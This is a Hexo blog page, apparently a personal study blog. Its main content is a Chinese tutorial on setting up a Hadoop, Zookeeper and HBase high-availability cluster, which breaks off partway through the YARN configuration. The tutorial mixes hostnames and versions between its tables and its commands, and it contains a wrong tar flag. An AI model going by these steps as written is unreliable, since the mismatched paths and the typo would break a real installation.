<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/page/3/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/3/">





  <title>Hexo</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Hexo</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/03/Hadoop/面试点/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/03/Hadoop/面试点/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-03T15:15:00+08:00">
                2019-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>1.shuffle过程</p>
<p>2.job提交过程</p>
<p>文具</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/03/Hadoop/hadoop+zookeeper+hbase HA搭建/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/03/Hadoop/hadoop+zookeeper+hbase HA搭建/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-03T15:15:00+08:00">
                2019-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Hadoop-HA高可用集群搭建（Hadoop-Zookeeper-HBase）"><a href="#Hadoop-HA高可用集群搭建（Hadoop-Zookeeper-HBase）" class="headerlink" title="Hadoop HA高可用集群搭建（Hadoop+Zookeeper+HBase）"></a>Hadoop HA高可用集群搭建（Hadoop+Zookeeper+HBase）</h1><h3 id="一、服务器环境"><a href="#一、服务器环境" class="headerlink" title="一、服务器环境"></a>一、服务器环境</h3><table>
<thead>
<tr>
<th></th>
<th>ip</th>
<th>用户名</th>
<th>安装目录（zookeeper,hadoop,hbase）</th>
</tr>
</thead>
<tbody>
<tr>
<td>hadoop1</td>
<td>172.30.0.12</td>
<td>hadoop</td>
<td>/home/hadoop/zookeeper,/home/hadoop/hadoop,/home/hadoop/hbase</td>
</tr>
<tr>
<td>hadoop2</td>
<td>172.30.0.7</td>
<td>hadoop</td>
<td>/home/hadoop/zookeeper,/home/hadoop/hadoop,/home/hadoop/hbase</td>
</tr>
<tr>
<td>hadoop3</td>
<td>172.30.0.2</td>
<td>hadoop</td>
<td>/home/hadoop/zookeeper,/home/hadoop/hadoop,/home/hadoop/hbase</td>
</tr>
<tr>
<td>hadoop4</td>
<td>172.30.0.4</td>
<td>hadoop</td>
<td>/home/hadoop/zookeeper,/home/hadoop/hadoop,/home/hadoop/hbase</td>
</tr>
</tbody>
</table>
<h3 id="二、集群规划"><a href="#二、集群规划" class="headerlink" title="二、集群规划"></a>二、集群规划</h3><table>
<thead>
<tr>
<th>hadoop1</th>
<th>hadoop2</th>
<th>hadoop3</th>
<th>hadoop4</th>
</tr>
</thead>
<tbody>
<tr>
<td>NameNode</td>
<td>NameNode</td>
<td></td>
<td></td>
</tr>
<tr>
<td>DataNode</td>
<td>DataNode</td>
<td>DataNode</td>
<td>DataNode</td>
</tr>
<tr>
<td>Zookeeper</td>
<td>Zookeeper</td>
<td>Zookeeper</td>
<td>Zookeeper</td>
</tr>
<tr>
<td>ResourceManager</td>
<td>ResourceManager</td>
<td></td>
<td></td>
</tr>
<tr>
<td>NodeManager</td>
<td>NodeManager</td>
<td>NodeManager</td>
<td>NodeManager</td>
</tr>
<tr>
<td>HMaster</td>
<td>HMasetr</td>
<td></td>
<td></td>
</tr>
<tr>
<td>RegionServer</td>
<td>RegionServer</td>
<td>RegionServer</td>
<td>RegionServer</td>
</tr>
</tbody>
</table>
<p>考虑到HBase与JDK、Hadoop各版本兼容性，我们采用的组件版本如下：</p>
<table>
<thead>
<tr>
<th>组件</th>
<th>版本</th>
</tr>
</thead>
<tbody>
<tr>
<td>JDK</td>
<td>1.8</td>
</tr>
<tr>
<td>Hadoop</td>
<td>2.7.6</td>
</tr>
<tr>
<td>Zookeeper</td>
<td>3.4.10</td>
</tr>
<tr>
<td>HBase</td>
<td>1.2.11</td>
</tr>
</tbody>
</table>
<h3 id="三、安装配置Zookeeper"><a href="#三、安装配置Zookeeper" class="headerlink" title="三、安装配置Zookeeper"></a>三、安装配置Zookeeper</h3><h4 id="1、下载及安装"><a href="#1、下载及安装" class="headerlink" title="1、下载及安装"></a>1、下载及安装</h4><p>下载地址：<a href="http://mirrors.hust.edu.cn/apache/zookeeper/zookeeper-3.4.10/zookeeper-3.4.10.tar.gz" target="_blank" rel="noopener">http://mirrors.hust.edu.cn/apache/zookeeper/zookeeper-3.4.10/zookeeper-3.4.10.tar.gz</a></p>
<p>在master188机器上，下载后解压到/home/hadoop/目录下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf zookeeper-3.4.10.tar.gz -C /home/hadoop/</span><br></pre></td></tr></table></figure>
<h4 id="2、拷贝-zoo-sample-cfg"><a href="#2、拷贝-zoo-sample-cfg" class="headerlink" title="2、拷贝 zoo_sample.cfg"></a>2、拷贝 <code>zoo_sample.cfg</code></h4><p>进入zookeeper的conf目录，拷贝<code>zoo_sample.cfg</code>并重命名为<code>zoo.cfg</code> ：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mv zookeeper-3.4.10 zookeeper</span><br><span class="line">cd zookeeper/conf/</span><br><span class="line"></span><br><span class="line">cp zoo_sample.cfg zoo.cfg</span><br></pre></td></tr></table></figure>
<h4 id="3、修改-zoo-cfg"><a href="#3、修改-zoo-cfg" class="headerlink" title="3、修改 zoo.cfg"></a>3、修改 <code>zoo.cfg</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi zoo.cfg</span><br></pre></td></tr></table></figure>
<p>修改如下，若原文件没有dataDir则直接添加：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dataDir=/home/hadoop/data/zkData</span><br><span class="line"></span><br><span class="line">//在最后添加，指定zookeeper集群主机及端口，机器数必须为奇数</span><br><span class="line">server.1=master188:2888:3888</span><br><span class="line">server.2=master189:2888:3888</span><br><span class="line">server.3=slave190:2888:3888</span><br></pre></td></tr></table></figure>
<h4 id="4、创建并编辑myid"><a href="#4、创建并编辑myid" class="headerlink" title="4、创建并编辑myid"></a>4、创建并编辑<code>myid</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//在zookeeper根目录下创建zoo.cfg中配置的目录</span><br><span class="line">mkdir data/zkData/ -p</span><br><span class="line"></span><br><span class="line">//创建并编辑文件</span><br><span class="line">vi myid</span><br><span class="line"></span><br><span class="line">//输入1，即表示当前机器为在zoo.cfg中指定的server.1</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">//保存退出</span><br><span class="line">:wq</span><br></pre></td></tr></table></figure>
<h4 id="5、拷贝zookeeper到其他机器"><a href="#5、拷贝zookeeper到其他机器" class="headerlink" title="5、拷贝zookeeper到其他机器"></a>5、拷贝zookeeper到其他机器</h4><p>上述操作是在master188机器上进行的，要将zookeeper拷贝到其他zookeeper集群机器上：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /home/hadoop</span><br><span class="line"></span><br><span class="line">scp -r zookeeper-3.4.11/ hadoop@master189:/home/hadoop/</span><br><span class="line"></span><br><span class="line">scp -r zookeeper-3.4.11/ hadoop@slave190:/home/hadoop/</span><br></pre></td></tr></table></figure>
<p>集群中各组件的安装目录最好保持一致。</p>
<h4 id="6、修改其他机器的myid文件"><a href="#6、修改其他机器的myid文件" class="headerlink" title="6、修改其他机器的myid文件"></a>6、修改其他机器的<code>myid</code>文件</h4><p><code>myid</code>文件是作为当前机器在zookeeper集群的标识，这些标识在<code>zoo.cfg</code>文件中已经配置好了，但是之前在master188这台机器上配置的<code>myid</code>为1，所以还需要修改其他机器的<code>myid</code>文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//在master189机器上</span><br><span class="line">echo 2 &gt; /home/hadoop/zookeeper-3.4.11/data/zkData/myid</span><br><span class="line">//在slave190机器上</span><br><span class="line">echo 3 &gt; /home/hadoop/zookeeper-3.4.11/data/zkData/myid</span><br></pre></td></tr></table></figure>
<h4 id="7、启动zookeeper集群"><a href="#7、启动zookeeper集群" class="headerlink" title="7、启动zookeeper集群"></a>7、启动zookeeper集群</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd zookeeper-3.4.11/bin/</span><br><span class="line">//分别在master188、master189、slave190上启动</span><br><span class="line">./zkServer.sh start</span><br><span class="line"></span><br><span class="line">//查看状态</span><br><span class="line">./zkServer.sh status</span><br></pre></td></tr></table></figure>
<p>三台机器的zookeeper状态必须只有一个<code>leader</code>，其他都是<code>follower</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//查看进程，若有QuorumpeerMain，则启动成功</span><br><span class="line">jps</span><br></pre></td></tr></table></figure>
<h3 id="四、安装配置Hadoop"><a href="#四、安装配置Hadoop" class="headerlink" title="四、安装配置Hadoop"></a>四、安装配置Hadoop</h3><h4 id="1、下载及安装-1"><a href="#1、下载及安装-1" class="headerlink" title="1、下载及安装"></a>1、下载及安装</h4><p>下载地址：<a href="http://mirrors.hust.edu.cn/apache/hadoop/common/hadoop-2.6.5/hadoop-2.6.5.tar.gz" target="_blank" rel="noopener">http://mirrors.hust.edu.cn/ap…</a></p>
<p>在master88机器上，解压到/home/hadoop/目录下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxcf hadoop-2.6.5.tar.gz -C /home/hadoop/</span><br></pre></td></tr></table></figure>
<h4 id="2、配置"><a href="#2、配置" class="headerlink" title="2、配置"></a>2、配置</h4><p>进入配置文件目录，修改配置文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd hadoop-2.6.5/etc/hadoop/</span><br></pre></td></tr></table></figure>
<h5 id="1）vi-hadoop-env-sh"><a href="#1）vi-hadoop-env-sh" class="headerlink" title="1）vi hadoop-env.sh"></a>1）vi hadoop-env.sh</h5><p>配置JDK安装路径：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JAVA_HOME=/opt/jdk</span><br></pre></td></tr></table></figure>
<h5 id="2）vi-core-site-xml"><a href="#2）vi-core-site-xml" class="headerlink" title="2）vi core-site.xml"></a>2）vi core-site.xml</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;!-- hdfs地址，ha模式中是连接到nameservice  --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;fs.defaultFS&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;hdfs://ns1&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">  &lt;!-- 这里的路径默认是NameNode、DataNode、JournalNode等存放数据的公共目录，也可以单独指定 --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;hadoop.tmp.dir&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;/home/hadoop/hadoop-2.6.5/tmp&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 指定ZooKeeper集群的地址和端口。注意，数量一定是奇数，且不少于三个节点--&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;ha.zookeeper.quorum&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;master188:2181,master189:2181,slave190:2181&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
<h5 id="3）vi-hdfs-site-xml"><a href="#3）vi-hdfs-site-xml" class="headerlink" title="3）vi hdfs-site.xml"></a>3）vi hdfs-site.xml</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;!-- 指定副本数，不能超过机器节点数  --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;dfs.replication&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;3&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 为namenode集群定义一个services name --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;dfs.nameservices&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;ns1&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- nameservice 包含哪些namenode，为各个namenode起名 --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;dfs.ha.namenodes.ns1&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;master188,master189&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 名为master188的namenode的rpc地址和端口号，rpc用来和datanode通讯 --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;dfs.namenode.rpc-address.ns1.master188&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;master188:9000&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 名为master189的namenode的rpc地址和端口号，rpc用来和datanode通讯 --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;dfs.namenode.rpc-address.ns1.master189&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;master189:9000&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!--名为master188的namenode的http地址和端口号，用来和web客户端通讯 --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;dfs.namenode.http-address.ns1.master188&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;master188:50070&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 名为master189的namenode的http地址和端口号，用来和web客户端通讯 --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;dfs.namenode.http-address.ns1.master189&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;master189:50070&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;!-- namenode间用于共享编辑日志的journal节点列表 --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;dfs.namenode.shared.edits.dir&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;qjournal://master188:8485;master189:8485;slave190:8485/ns1&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 指定该集群出现故障时，是否自动切换到另一台namenode --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;dfs.ha.automatic-failover.enabled.ns1&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;true&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- journalnode 上用于存放edits日志的目录 --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;dfs.journalnode.edits.dir&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;/home/hadoop/hadoop-2.6.5/tmp/data/dfs/journalnode&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 客户端连接可用状态的NameNode所用的代理类 --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;dfs.client.failover.proxy.provider.ns1&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;org.apache.hadoop.hdfs.server.namenode.ha.ConfiguredFailoverProxyProvider&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 一旦需要NameNode切换，使用ssh方式进行操作 --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;dfs.ha.fencing.methods&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;sshfence&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 如果使用ssh进行故障切换，使用ssh通信时用的密钥存储的位置 --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;dfs.ha.fencing.ssh.private-key-files&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;/home/hadoop/.ssh/id_rsa&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- connect-timeout超时时间 --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;dfs.ha.fencing.ssh.connect-timeout&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;30000&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
<h5 id="4）vi-mapred-site-xml"><a href="#4）vi-mapred-site-xml" class="headerlink" title="4）vi mapred-site.xml"></a>4）vi mapred-site.xml</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 采用yarn作为mapreduce的资源调度框架 --&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;mapreduce.framework.name&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;yarn&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
<h5 id="5）vi-yarn-site-xml"><a href="#5）vi-yarn-site-xml" class="headerlink" title="5）vi yarn-site.xml"></a>5）vi yarn-site.xml</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 启用HA高可用性 --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;yarn.resourcemanager.ha.enabled&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;true&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 指定resourcemanager的名字 --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;yarn.resourcemanager.cluster-id&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;yrc&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 使用了2个resourcemanager,分别指定Resourcemanager的地址 --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;yarn.resourcemanager.ha.rm-ids&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;rm1,rm2&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;!-- 指定rm1的地址 --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;yarn.resourcemanager.hostname.rm1&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;master188&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;!-- 指定rm2的地址  --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;yarn.resourcemanager.hostname.rm2&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;master189&lt;/value&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;!-- 指定当前机器master188作为rm1 --&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;yarn.resourcemanager.ha.id&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;rm1&lt;/value&gt;</span><br><span class="line">  